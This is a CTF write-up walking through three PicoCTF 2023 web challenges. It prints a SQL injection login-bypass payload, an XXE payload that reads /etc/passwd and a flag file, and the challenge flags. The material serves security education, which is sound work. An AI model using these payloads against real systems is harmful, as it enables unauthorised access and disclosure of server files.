PicoCTF 2023: Web Exploitation Writeup

PicoCTF 2023 was one of the most competitive collegiate CTF events of the year, attracting thousands of teams worldwide. Our GannonHack team tackled all web exploitation challenges, here's a full walkthrough of the ones we solved.

Challenge 1: SQLiLite Easy

Challenge Description

A login page is vulnerable to SQL injection. The goal is to bypass authentication and retrieve the flag from the database.

Solution

Opening the page, we see a standard login form. The first thing to try is a classic SQLi bypass payload in the username field:

Username: admin' OR '1'='1
Password: anything

This transforms the SQL query to:

SELECT * FROM users WHERE username='admin' OR '1'='1' AND password='anything'

Since '1'='1' is always true, the WHERE clause evaluates to true and we're logged in. The flag was displayed on the dashboard.

🚩 Flag picoCTF{L0gin_b4ck_d00r_c3d02b59}

Challenge 2: findme Easy

Challenge Description

The challenge gives us a URL and hints that the flag is hidden somewhere in the redirect chain.

Solution

We used curl with the -L flag to follow all redirects and -v to print headers:

$ curl -Lv http://saturn.picoctf.net:PORT/

Inspecting the output, we found the flag was base64-encoded and split across two redirect Location headers:

Location: /next-page/id=cGljb0NURntwcm94...
Location: /next-page/id=...aWVzX3NvbHZlZH0=

Decoded and concatenated:

$ echo "cGljb0NURntwcm94aWVzX3NvbHZlZH0=" | base64 -d
picoCTF{proxies_solved}
🚩 Flag picoCTF{proxies_solved}

Challenge 3: SOAP Medium

Challenge Description

A web app uses a SOAP API to fetch user data. The endpoint is vulnerable to XXE (XML External Entity) injection.

Solution

We intercepted a request using Burp Suite and found the app was sending XML to the backend. By injecting an XXE payload, we could read local files:

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<data><user>&xxe;</user></data>

The server returned the contents of /etc/passwd. We then targeted the flag file directly:

<!ENTITY xxe SYSTEM "file:///flag">
🚩 Flag picoCTF{XML_3xtern@l_3nt1ty_4a9f6252}

Key Takeaways

  • Always try classic SQLi payloads on login forms, many CTF challenges still use them.
  • Use curl -Lv to inspect redirect chains when a challenge involves URLs.
  • If an app sends XML to the server, test for XXE, especially if it uses older SOAP-style APIs.
  • Burp Suite Community Edition is your best friend for web challenges.
